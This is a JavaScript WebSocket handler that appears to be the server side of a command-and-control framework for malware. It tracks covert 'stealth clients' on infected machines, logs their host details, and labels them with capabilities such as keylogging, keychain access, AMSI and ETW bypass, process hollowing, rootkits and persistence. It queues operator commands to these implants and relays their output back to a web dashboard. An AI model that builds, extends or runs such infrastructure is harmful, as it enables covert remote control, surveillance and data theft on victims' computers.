const mongoose = require('mongoose');
const Client = require('../models/Client');
const Task = require('../models/Task');

// Store all connected web clients for broadcasting
const webClients = new Set();
const stealthClients = new Map(); // Map of uuid -> websocket

// Platform detection utilities
function detectOperatingSystem(platformString, userAgent) {
    if (!platformString && !userAgent) return 'unknown';
    
    const combined = `${platformString || ''} ${userAgent || ''}`.toLowerCase();
    
    if (combined.includes('windows')) return 'windows';
    if (combined.includes('linux')) return 'linux';
    if (combined.includes('macos') || combined.includes('darwin')) return 'macos';
    if (combined.includes('android')) return 'android';
    if (combined.includes('ios')) return 'ios';
    
    return 'unknown';
}

function detectArchitecture(platformString, systemInfo) {
    if (!platformString && !systemInfo) return 'unknown';
    
    const combined = `${platformString || ''} ${JSON.stringify(systemInfo || {})}`.toLowerCase();
    
    if (combined.includes('x64') || combined.includes('amd64') || combined.includes('x86_64')) return 'x64';
    if (combined.includes('arm64') || combined.includes('aarch64')) return 'arm64';
    if (combined.includes('arm')) return 'arm';
    if (combined.includes('x86') || combined.includes('i386') || combined.includes('i686')) return 'x86';
    
    return 'unknown';
}

function extractCapabilities(data) {
    const capabilities = {
        persistence: [],
        injection: [],
        evasion: [],
        commands: [],
        features: []
    };
    
    // Extract capabilities based on platform and reported features
    const os = detectOperatingSystem(data.platform, data.userAgent);
    
    switch (os) {
        case 'windows':
            capabilities.persistence = ['registry', 'startup', 'service', 'task_scheduler'];
            capabilities.injection = ['dll_injection', 'process_hollowing', 'reflective_dll'];
            capabilities.evasion = ['amsi_bypass', 'etw_bypass', 'unhook'];
            capabilities.commands = ['powershell', 'cmd', 'wmi', 'registry'];
            capabilities.features = ['screenshot', 'keylogger', 'file_manager', 'process_manager'];
            break;
        case 'linux':
            capabilities.persistence = ['cron', 'systemd', 'bashrc', 'init_d'];
            capabilities.injection = ['ld_preload', 'ptrace'];
            capabilities.evasion = ['process_hiding', 'rootkit'];
            capabilities.commands = ['bash', 'sh', 'python', 'perl'];
            capabilities.features = ['screenshot', 'file_manager', 'process_manager'];
            break;
        case 'macos':
            capabilities.persistence = ['launchd', 'cron', 'login_items'];
            capabilities.injection = ['dylib_injection', 'mach_inject'];
            capabilities.evasion = ['codesign_bypass', 'gatekeeper_bypass'];
            capabilities.commands = ['bash', 'zsh', 'osascript', 'defaults'];
            capabilities.features = ['screenshot', 'keychain_access', 'file_manager'];
            break;
        default:
            capabilities.commands = ['basic_shell'];
            capabilities.features = ['basic_info'];
    }
    
    // Add reported capabilities if available
    if (data.capabilities) {
        Object.keys(capabilities).forEach(key => {
            if (data.capabilities[key]) {
                capabilities[key] = [...new Set([...capabilities[key], ...data.capabilities[key]])];
            }
        });
    }
    
    return capabilities;
}

// Broadcast function to send data to all web clients
function broadcastToWebClients(data) {
    const message = JSON.stringify(data);
    webClients.forEach(client => {
        if (client.readyState === client.OPEN) {
            client.send(message);
        } else {
            webClients.delete(client);
        }
    });
}

module.exports = function connectionHandler(ws) {
    // Log when a new client connects to help with debugging
    console.log('A new client connected via WebSocket.');

    ws.on('message', async (message) => {
        try {
            // The incoming message is a Buffer, so it must be converted to a string
            // before it can be parsed as JSON. This was the source of the error.
            const messageString = message.toString();
            const data = JSON.parse(messageString);

            // Handle web client identification
            if (data.type === 'web_client') {
                ws.clientType = 'web';
                webClients.add(ws);
                console.log('Web client connected. Total web clients:', webClients.size);
                
                // Send current client list to new web client
                const clients = await Client.find({});
                ws.send(JSON.stringify({
                    type: 'client_list_update',
                    clients: clients
                }));
                return;
            }

            // Handle capability discovery messages
            if (data.type === 'capability_report') {
                const { uuid, capabilities: reportedCapabilities } = data;
                if (uuid) {
                    await Client.findOneAndUpdate(
                        { uuid: uuid },
                        { 
                            $set: { 
                                capabilities: reportedCapabilities,
                                lastHeartbeat: new Date()
                            }
                        }
                    );
                    
                    // Broadcast capability update to web clients
                    broadcastToWebClients({
                        type: 'client_capabilities_update',
                        uuid: uuid,
                        capabilities: reportedCapabilities
                    });
                }
                return;
            }

            if (data.type === 'output') {
                // This is an output message from a stealth client
                const { taskId, output } = data;
                await Task.findByIdAndUpdate(taskId, { output: output });
                
                // Broadcast task completion to web clients
                broadcastToWebClients({
                    type: 'task_completed',
                    taskId: taskId,
                    output: output
                });
                return;
            }

            // Handle stealth client messages
            if (data.uuid) {
                ws.uuid = data.uuid;
                ws.clientType = 'stealth';
                stealthClients.set(data.uuid, ws);
            } else {
                return; // Ignore messages without a UUID
            }
            
            console.log(`Received data from stealth client ${data.uuid}`);

            // Detect platform information
            const operatingSystem = detectOperatingSystem(data.platform, data.userAgent);
            const architecture = detectArchitecture(data.platform, data.systemInfo);
            const capabilities = extractCapabilities(data);

            // Find the client by UUID and update its details, or create it if it doesn't exist.
            let updatedClient = await Client.findOne({ uuid: data.uuid });
            
            if (updatedClient) {
                // Update existing client with enhanced platform information
                updatedClient.ip = data.ip || data.ipAddress || 'Unknown';
                updatedClient.ipAddress = data.ipAddress || data.ip || 'Unknown';
                updatedClient.computerName = data.computerName || data.hostname || 'Unknown';
                updatedClient.hostname = data.hostname || 'Unknown';
                updatedClient.platform = data.platform || 'Unknown';
                updatedClient.operatingSystem = operatingSystem;
                updatedClient.osVersion = data.osVersion || data.version || 'Unknown';
                updatedClient.architecture = architecture;
                updatedClient.capabilities = capabilities;
                updatedClient.country = data.country || 'Unknown';
                updatedClient.lastSeen = new Date();
                updatedClient.lastActiveTime = new Date();
                updatedClient.lastHeartbeat = new Date();
                updatedClient.status = 'online';
                updatedClient.connectionCount = (updatedClient.connectionCount || 0) + 1;
                
                // Update system information if provided
                if (data.systemInfo) {
                    updatedClient.systemInfo = {
                        ...updatedClient.systemInfo,
                        ...data.systemInfo
                    };
                }
                
                await updatedClient.save();
            } else {
                // Create new client with enhanced platform information
                updatedClient = new Client({
                    uuid: data.uuid,
                    ip: data.ip || data.ipAddress || 'Unknown',
                    ipAddress: data.ipAddress || data.ip || 'Unknown',
                    computerName: data.computerName || data.hostname || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    platform: data.platform || 'Unknown',
                    operatingSystem: operatingSystem,
                    osVersion: data.osVersion || data.version || 'Unknown',
                    architecture: architecture,
                    capabilities: capabilities,
                    country: data.country || 'Unknown',
                    lastSeen: new Date(),
                    lastActiveTime: new Date(),
                    lastHeartbeat: new Date(),
                    status: 'online',
                    connectionCount: 1,
                    systemInfo: data.systemInfo || {}
                });
                await updatedClient.save();
            }

            // Broadcast client status update to all web clients
            broadcastToWebClients({
                type: 'client_status_update',
                client: updatedClient
            });

            // Check for any pending tasks for this client
            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
            for (const task of tasks) {
                // Validate command compatibility before sending
                const isCompatible = validateCommandCompatibility(task.command, operatingSystem, capabilities);
                
                if (isCompatible) {
                    ws.send(JSON.stringify({ cmd: task.command, taskId: task._id }));
                    task.status = 'executed';
                    await task.save();
                    
                    // Broadcast task execution to web clients
                    broadcastToWebClients({
                        type: 'task_executed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        command: task.command
                    });
                } else {
                    // Mark task as failed due to incompatibility
                    task.status = 'failed';
                    task.output = `Command not compatible with ${operatingSystem} platform`;
                    await task.save();
                    
                    broadcastToWebClients({
                        type: 'task_failed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        reason: 'Platform incompatibility'
                    });
                }
            }

        } catch (err) {
            console.error('WebSocket message processing error:', err);
        }
    });

    ws.on('close', async () => {
        console.log('Client disconnected');
        
        if (ws.clientType === 'web') {
            webClients.delete(ws);
            console.log('Web client disconnected. Total web clients:', webClients.size);
        } else if (ws.uuid && ws.clientType === 'stealth') {
            stealthClients.delete(ws.uuid);
            
            const updatedClient = await Client.findOneAndUpdate(
                { uuid: ws.uuid },
                { $set: { status: 'offline' } },
                { new: true }
            );
            
            // Broadcast client disconnection to all web clients
            if (updatedClient) {
                broadcastToWebClients({
                    type: 'client_status_update',
                    client: updatedClient
                });
            }
        }
    });

    ws.on('error', (error) => {
        console.error('WebSocket error on connection:', error);
    });
};

// Command compatibility validation
function validateCommandCompatibility(command, operatingSystem, capabilities) {
    // Basic platform-specific command validation
    const windowsCommands = ['powershell', 'cmd', 'wmic', 'reg ', 'net ', 'sc '];
    const linuxCommands = ['bash', 'sh', 'ps ', 'kill ', 'grep ', 'find ', 'ls '];
    const macosCommands = ['bash', 'zsh', 'osascript', 'defaults', 'launchctl'];
    
    const commandLower = command.toLowerCase();
    
    switch (operatingSystem) {
        case 'windows':
            return windowsCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'linux':
            return linuxCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'macos':
            return macosCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        default:
            // For unknown platforms, allow basic commands
            return capabilities.commands.includes('basic_shell') || 
                   ['echo', 'whoami', 'pwd'].some(cmd => commandLower.includes(cmd));
    }
}
